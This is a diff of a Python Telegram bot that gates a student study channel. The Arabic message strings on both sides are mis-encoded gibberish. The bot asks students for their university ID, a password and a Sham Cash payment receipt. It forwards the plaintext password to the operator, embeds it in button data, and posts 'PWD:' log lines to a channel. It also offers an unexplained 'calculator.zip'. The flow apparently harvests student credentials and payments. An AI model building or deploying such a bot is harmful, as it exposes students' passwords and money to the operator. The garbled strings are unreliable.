@@ -34,23 +34,24 @@ def handle_start(message):
     try:
         status = student_bot.get_chat_member(CHANNEL_ID, uid).status
         if status in ['member', 'administrator', 'creator']:
-            student_bot.send_message(uid, "?? ÃåáÇğ Èß ãÌÏÏÇğ! ÍÓÇÈß äÔØ æãİÚøá İí ÇáãæÓæÚÉ ÇáãÚãÇÑíÉ.")
+            student_bot.send_message(uid, "ğŸ”“ Ø£Ù‡Ù„Ø§Ù‹ Ø¨Ùƒ Ù…Ø¬Ø¯Ø¯Ø§Ù‹! Ø­Ø³Ø§Ø¨Ùƒ Ù†Ø´Ø· ÙˆÙ…ÙØ¹Ù‘Ù„ ÙÙŠ Ø§Ù„Ù…ÙˆØ³ÙˆØ¹Ø© Ø§Ù„Ù…Ø¹Ù…Ø§Ø±ÙŠØ©.")
             return
     except:
         pass
     
-    msg = student_bot.send_message(uid, "?? ÇáãæÓæÚÉ ãŞİáÉº ÇáÑÌÇÁ ÅÏÎÇá ÑŞãß ÇáÌÇãÚí áÈÏÁ ÇáÊÍŞŞ æÇáãØÇÈŞÉ:")
+    msg = student_bot.send_message(uid, "ğŸ“ Ø§Ù„Ù…ÙˆØ³ÙˆØ¹Ø© Ù…Ù‚ÙÙ„Ø©Ø› Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù‚Ù…Ùƒ Ø§Ù„Ø¬Ø§Ù…Ø¹ÙŠ Ù„Ø¨Ø¯Ø¡ Ø§Ù„ØªØ­Ù‚Ù‚ ÙˆØ§Ù„Ù…Ø·Ø§Ø¨Ù‚Ø©:")
     student_bot.register_next_step_handler(msg, save_uni_id)
+
 def save_uni_id(message):
     uid = message.from_user.id
     uni_id = message.text.strip()
-    msg = student_bot.send_message(uid, "?? ÇÎÊÑ ßáãÉ ãÑæÑ ÎÇÕÉ ÈÍÓÇÈß áÍãÇíÉ ÈíÇäÇÊß:")
+    msg = student_bot.send_message(uid, "ğŸ”’ Ø§Ø®ØªØ± ÙƒÙ„Ù…Ø© Ù…Ø±ÙˆØ± Ø®Ø§ØµØ© Ø¨Ø­Ø³Ø§Ø¨Ùƒ Ù„Ø­Ù…Ø§ÙŠØ© Ø¨ÙŠØ§Ù†Ø§ØªÙƒ:")
     student_bot.register_next_step_handler(msg, save_password, uni_id)
 
 def save_password(message, uni_id):
     uid = message.from_user.id
     password = message.text.strip()
-    msg = student_bot.send_message(uid, "?? ãÇÏÉ (ËŞÇİÉ ÚÑÈíÉ) ãŞİáÉ.\nÇáÑÌÇÁ ÅÏÎÇá ÑŞã ÚãáíÉ ÊÍæíá ÔÇã ßÇÔ ÇáãÑÌÚí áØáÈ ÇáÊİÚíá:")
+    msg = student_bot.send_message(uid, "ğŸ’° Ù…Ø§Ø¯Ø© (Ø«Ù‚Ø§ÙØ© Ø¹Ø±Ø¨ÙŠØ©) Ù…Ù‚ÙÙ„Ø©.\nØ§Ù„Ø±Ø¬Ø§Ø¡ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù‚Ù… Ø¹Ù…Ù„ÙŠØ© ØªØ­ÙˆÙŠÙ„ Ø´Ø§Ù… ÙƒØ§Ø´ Ø§Ù„Ù…Ø±Ø¬Ø¹ÙŠ Ù„Ø·Ù„Ø¨ Ø§Ù„ØªÙØ¹ÙŠÙ„:")
     student_bot.register_next_step_handler(msg, handle_payment, uni_id, password)
 
 def handle_payment(message, uni_id, password):
@@ -58,19 +59,20 @@ def handle_payment(message, uni_id, password):
     receipt = message.text.strip()
 
     if receipt in pending_receipts:
-        student_bot.send_message(uid, "? ÎØÃ: ÑŞã ÚãáíÉ ÔÇã ßÇÔ åĞå ÊÍÊ ÇáãÑÇÌÚÉ ÍÇáíÇğ! Êã ÅáÛÇÁ ÇáØáÈ ÊáŞÇÆíÇğ.")
+        student_bot.send_message(uid, "âŒ Ø®Ø·Ø£: Ø±Ù‚Ù… Ø¹Ù…Ù„ÙŠØ© Ø´Ø§Ù… ÙƒØ§Ø´ Ù‡Ø°Ù‡ ØªØ­Øª Ø§Ù„Ù…Ø±Ø§Ø¬Ø¹Ø© Ø­Ø§Ù„ÙŠØ§Ù‹! ØªÙ… Ø¥Ù„ØºØ§Ø¡ Ø§Ù„Ø·Ù„Ø¨ ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹.")
         return
 
     pending_receipts.add(receipt)
 
     markup = types.InlineKeyboardMarkup()
-    btn_app = types.InlineKeyboardButton("? ãæÇİŞÉ æÊİÚíá ÇáÍÓÇÈ", callback_data=f"acc_{uid}_{uni_id}_{password}")
-    btn_rej = types.InlineKeyboardButton("? ÑİÖ ÇáØáÈ", callback_data=f"den_{uid}")
+    btn_app = types.InlineKeyboardButton("âœ… Ù…ÙˆØ§ÙÙ‚Ø© ÙˆØªÙØ¹ÙŠÙ„ Ø§Ù„Ø­Ø³Ø§Ø¨", callback_data=f"acc_{uid}_{uni_id}_{password}")
+    btn_rej = types.InlineKeyboardButton("âŒ Ø±ÙØ¶ Ø§Ù„Ø·Ù„Ø¨", callback_data=f"den_{uid}")
     markup.row(btn_app, btn_rej)
 
-    text = f"?? ØáÈ ÊİÚíá æãØÇÈŞÉ ÌÏíÏ:\n\n?? ÂíÏí ÇáØÇáÈ: {uid}\n?? ÇáÑŞã ÇáÌÇãÚí: {uni_id}\n?? ÇáÈÇÓæÑÏ: {password}\n?? ÑŞã ÇáÍæÇáÉ: {receipt}"
+    text = f"ğŸ”” Ø·Ù„Ø¨ ØªÙØ¹ÙŠÙ„ ÙˆÙ…Ø·Ø§Ø¨Ù‚Ø© Ø¬Ø¯ÙŠØ¯:\n\nğŸ‘¤ Ø¢ÙŠØ¯ÙŠ Ø§Ù„Ø·Ø§Ù„Ø¨: {uid}\nğŸ“ Ø§Ù„Ø±Ù‚Ù… Ø§Ù„Ø¬Ø§Ù…Ø¹ÙŠ: {uni_id}\nğŸ”‘ Ø§Ù„Ø¨Ø§Ø³ÙˆØ±Ø¯: {password}\nğŸ’µ Ø±Ù‚Ù… Ø§Ù„Ø­ÙˆØ§Ù„Ø©: {receipt}"
     admin_bot.send_message(MY_PERSONAL_ID, text, reply_markup=markup)
-    student_bot.send_message(uid, "? Êã ÅÑÓÇá ÈíÇäÇÊß æÑŞã ÇáÚãáíÉ ÈäÌÇÍ. íÑÌì ÇáÇäÊÙÇÑ áÍíä ãÑÇÌÚÉ ÇáÍæÇáÉ íÏæíÇğ ãä ŞöÈá ÇáÅÏÇÑÉ.")
+    student_bot.send_message(uid, "â³ ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø¨ÙŠØ§Ù†Ø§ØªÙƒ ÙˆØ±Ù‚Ù… Ø§Ù„Ø¹Ù…Ù„ÙŠØ© Ø¨Ù†Ø¬Ø§Ø­. ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± Ù„Ø­ÙŠÙ† Ù…Ø±Ø§Ø¬Ø¹Ø© Ø§Ù„Ø­ÙˆØ§Ù„Ø© ÙŠØ¯ÙˆÙŠØ§Ù‹ Ù…Ù† Ù‚ÙØ¨Ù„ Ø§Ù„Ø¥Ø¯Ø§Ø±Ø©.")
+
 @admin_bot.callback_query_handler(func=lambda call: True)
 def handle_admin_buttons(call):
     parts = call.data.split('_')
@@ -87,16 +89,16 @@ def handle_admin_buttons(call):
             database_text = f"DATA_LOG\nID:{target_uid}\nUNI:{uni_id}\nPWD:{password}"
             student_bot.send_message(CHANNEL_ID, database_text)
             
-            student_bot.send_message(target_uid, f"?? ãÈÇÑß! ÊãÊ ãØÇÈŞÉ ÍæÇáÊß ÈäÌÇÍ.\nÊã İÊÍ ÇáŞİá ÇáÃÎÖÑ ?? æÊİÚíá ÍÓÇÈß.\n\nÑÇÈØ ÊÕİÍ ÇáãáİÇÊ æÇáãÓÊäÏÇÊ ÃæİáÇíä ÈÂãÇä ÏÇÎá ÇáŞäÇÉ ÇáãÍãíÉ:\n{link}")
-            admin_bot.edit_message_text(f"? Êã ŞÈæá ÇáØÇáÈ {target_uid} ÈäÌÇÍ æÊæËíŞå İí ŞÇÚÏÉ ÈíÇäÇÊ ÇáŞäÇÉ ÇáÓÍÇÈíÉ.", chat_id=MY_PERSONAL_ID, message_id=call.message.message_id)
+            student_bot.send_message(target_uid, f"ğŸ‰ Ù…Ø¨Ø§Ø±Ùƒ! ØªÙ…Øª Ù…Ø·Ø§Ø¨Ù‚Ø© Ø­ÙˆØ§Ù„ØªÙƒ Ø¨Ù†Ø¬Ø§Ø­.\nØªÙ… ÙØªØ­ Ø§Ù„Ù‚ÙÙ„ Ø§Ù„Ø£Ø®Ø¶Ø± ğŸ”“ ÙˆØªÙØ¹ÙŠÙ„ Ø­Ø³Ø§Ø¨Ùƒ.\n\nØ±Ø§Ø¨Ø· ØªØµÙØ­ Ø§Ù„Ù…Ù„ÙØ§Øª ÙˆØ§Ù„Ù…Ø³ØªÙ†Ø¯Ø§Øª Ø£ÙˆÙÙ„Ø§ÙŠÙ† Ø¨Ø¢Ù…Ø§Ù† Ø¯Ø§Ø®Ù„ Ø§Ù„Ù‚Ù†Ø§Ø© Ø§Ù„Ù…Ø­Ù…ÙŠØ©:\n{link}")
+            admin_bot.edit_message_text(f"âœ… ØªÙ… Ù‚Ø¨ÙˆÙ„ Ø§Ù„Ø·Ø§Ù„Ø¨ {target_uid} Ø¨Ù†Ø¬Ø§Ø­ ÙˆØªÙˆØ«ÙŠÙ‚Ù‡ ÙÙŠ Ù‚Ø§Ø¹Ø¯Ø© Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù‚Ù†Ø§Ø© Ø§Ù„Ø³Ø­Ø§Ø¨ÙŠØ©.", chat_id=MY_PERSONAL_ID, message_id=call.message.message_id)
             
         except Exception as e:
-            admin_bot.answer_callback_query(call.id, f"? ÎØÃ ÈÑãÌí: {str(e)}")
+            admin_bot.answer_callback_query(call.id, f"âŒ Ø®Ø·Ø£ Ø¨Ø±Ù…ÙŠ: {str(e)}")
             
     elif action == "den":
         try:
-            student_bot.send_message(target_uid, "? äÚÊĞÑ ãäß¡ Êã ÑİÖ ØáÈß áÃä ÑŞã ÚãáíÉ ÔÇã ßÇÔ ÛíÑ ãØÇÈŞ áßÔİ ÇáÍÓÇÈ Ãæ ÇáÍÓÇÈ ãÓÊÎÏã ãÓÈŞÇğ.")
-            admin_bot.edit_message_text(f"? Êã ÑİÖ ØáÈ ÇáØÇáÈ {target_uid} æÅÎØÇÑå İæÑÇğ.", chat_id=MY_PERSONAL_ID, message_id=call.message.message_id)
+            student_bot.send_message(target_uid, "âŒ Ù†Ø¹ØªØ°Ø± Ù…Ù†ÙƒØŒ ØªÙ… Ø±ÙØ¶ Ø·Ù„Ø¨Ùƒ Ù„Ø£Ù† Ø±Ù‚Ù… Ø¹Ù…Ù„ÙŠØ© Ø´Ø§Ù… ÙƒØ§Ø´ ØºÙŠØ± Ù…Ø·Ø§Ø¨Ù‚ Ù„ÙƒØ´Ù Ø§Ù„Ø­Ø³Ø§Ø¨ Ø£Ùˆ Ø§Ù„Ø­Ø³Ø§Ø¨ Ù…Ø³ØªØ®Ø¯Ù… Ù…Ø³Ø¨Ù‚Ø§Ù‹.")
+            admin_bot.edit_message_text(f"âŒ ØªÙ… Ø±ÙØ¶ Ø·Ù„Ø¨ Ø§Ù„Ø·Ø§Ù„Ø¨ {target_uid} ÙˆØ¥Ø®Ø·Ø§Ø±Ù‡ ÙÙˆØ±Ø§Ù‹.", chat_id=MY_PERSONAL_ID, message_id=call.message.message_id)
         except:
             pass
 
@@ -105,9 +107,9 @@ def send_excel(message):
     uid = message.from_user.id
     try:
         with open("calculator.zip", "rb") as file:
-            student_bot.send_document(uid, file, caption="?? ÊİÖá¡ ãáİ ÍÇÓÈÉ ÇáãÚÏá ÇáÊÑÇßãí ÇáãÌåÒ ãÌÇäÇğ ÈÕíÛÉ ZIP.")
+            student_bot.send_document(uid, file, caption="ğŸ’¾ ØªÙØ¶Ù„ØŒ Ù…Ù„Ù Ø­Ø§Ø³Ø¨Ø© Ø§Ù„Ù…Ø¹Ø¯Ù„ Ø§Ù„ØªØ±Ø§ÙƒÙ…ÙŠ Ø§Ù„Ù…Ø¬Ù‡Ø² Ù…Ø¬Ø§Ù†Ø§Ù‹ Ø¨ØµÙŠØºØ© ZIP.")
     except:
-        student_bot.send_message(uid, "? ÚĞÑÇğ¡ ãáİ ÇáÍÇÓÈÉ ÇáãÖÛæØ ÛíÑ ãÊæİÑ ÍÇáíÇğ Úáì ÇáÓíÑİÑ.")
+        student_bot.send_message(uid, "âŒ Ø¹Ø°Ø±Ø§Ù‹ØŒ Ù…Ù„Ù Ø§Ù„Ø­Ø§Ø³Ø¨Ø© Ø§Ù„Ù…Ø¶ØºÙˆØ· ØºÙŠØ± Ù…ØªÙˆÙØ± Ø­Ø§Ù„ÙŠØ§Ù‹ Ø¹Ù„Ù‰ Ø§Ù„Ø³ÙŠØ±ÙØ±.")
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
